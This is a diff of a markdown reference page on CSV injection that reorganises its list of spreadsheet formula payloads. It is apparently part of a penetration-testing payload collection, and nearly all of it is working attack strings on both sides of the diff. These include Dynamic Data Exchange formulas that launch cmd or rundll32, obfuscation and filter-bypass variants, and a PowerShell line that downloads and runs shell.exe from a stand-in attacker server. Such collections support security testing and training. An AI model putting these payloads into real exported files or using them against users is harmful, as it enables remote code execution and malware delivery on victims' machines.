@@ -1,53 +1,49 @@
 # CSV Injection
 
-Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
+> Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
 
-## Exploit
+
+## Summary
+
+* [Methodology](#methodology)
+* [References](#references)
+
+
+## Methodology
 
 Basic exploits with **Dynamic Data Exchange**.
 
+* Spawn a calc
+    ```powershell
+    DDE ("cmd";"/C calc";"!A0")A0
+    @SUM(1+1)*cmd|' /C calc'!A0
+    =2+5+cmd|' /C calc'!A0
+    =cmd|' /C calc'!'A1'
+    ```
 
-Payload: pop a calc
+* PowerShell download and execute
+    ```powershell
+    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+    ```
 
-```powershell
-DDE ("cmd";"/C calc";"!A0")A0
-@SUM(1+1)*cmd|' /C calc'!A0
-=2+5+cmd|' /C calc'!A0
-```
+* Prefix obfuscation and command chaining
+    ```powershell
+    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
+    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+    +thespanishinquisition(cmd|'/c calc.exe'!A
+    =         cmd|'/c calc.exe'!A
+    ```
 
-Payload: pop a notepad
+* Using rundll32 instead of cmd
+    ```powershell
+    =rundll32|'URL.dll,OpenURL calc.exe'!A
+    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
+    ```
 
-```powershell
-=cmd|' /C notepad'!'A1'
-```
-
-Payload: powershell download and execute
-
-```powershell
-=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
-```
-
-Payload: Prefix obfuscation and command chaining
-
-```powershell
-=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
-=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
-+thespanishinquisition(cmd|'/c calc.exe'!A
-=         cmd|'/c calc.exe'!A
-```
-
-Payload: Using rundll32 instead of cmd
-
-```powershell
-=rundll32|'URL.dll,OpenURL calc.exe'!A
-=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
-```
-
-Payload: Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
-
-```powershell
-=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
-```
+* Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
+    ```powershell
+    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
+    ```
 
 Technical details of the above payloads:
 
